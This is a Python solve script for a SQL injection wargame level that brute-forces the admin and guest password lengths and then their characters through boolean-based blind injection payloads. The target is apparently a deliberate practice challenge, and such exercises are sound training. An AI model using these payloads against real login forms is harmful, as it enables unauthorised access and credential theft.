import requests as req 

url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
ck={"PHPSESSID":"uc6eohgs2j6aihdl3pde9v2692"}

for i in range(100):
	params = {"pw":f"'||length(pw) like {i}-- "}
	with req.get(url, params=params, cookies=ck) as res:
		if "Hello admin" in res.text:
			print("Hello admin",i)
		elif "Hello guest" in res.text:
			print("Hello guest",i)
			break

			# admin의 pw가 더 긴걸 확인해서 break사용 

# admin's pw length = 8
# guest's pw length = 17

ans_ad=''
ans_gu=''

for i in range(8):
	i += 1
	for j in range(33, 126):
		params = {"pw":f"'||ascii(substring(pw, {i}, 1)) like {j}-- "}
		with req.get(url, params=params, cookies=ck) as res:
			if "Hello admin" in res.text:
				ans_ad += chr(j)
				print("admin's pw =", ans_ad)
				break

for i in range(15):
	i += 1
	for j in range(33, 126):
		params = {"pw":f"'||ascii(substring(pw, {i}, 1)) like {j}-- "}
		with req.get(url, params=params, cookies=ck) as res:
			if "Hello guest" in res.text:
				ans_gu += chr(j)
				print("guest's pw =", ans_gu)
				break
